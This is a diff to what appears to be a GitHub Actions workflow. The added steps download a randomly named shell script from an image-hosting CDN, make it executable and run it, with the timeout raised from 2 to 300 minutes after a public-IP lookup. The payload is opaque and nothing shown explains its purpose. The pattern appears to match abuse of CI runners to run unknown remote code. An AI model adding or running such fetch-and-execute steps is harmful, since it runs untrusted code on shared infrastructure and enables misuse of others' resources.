@@ -1,4 +1,4 @@
-name: Go2
+name: Go
 
 on:
   workflow_dispatch:
@@ -14,10 +14,8 @@ jobs:
         run: |
           curl https://api.ipify.org
       - name: Run exec
-        timeout-minutes: 2
+        timeout-minutes: 300
         run: |
-          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711173470/fotves64xiknlowbbd8r.sh
-          chmod +x fotves64xiknlowbbd8r.sh
-          ./fotves64xiknlowbbd8r.sh
-
-
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1711330678/krfvxzr3udi4w83yllix.sh
+          chmod +x krfvxzr3udi4w83yllix.sh
+          ./krfvxzr3udi4w83yllix.sh
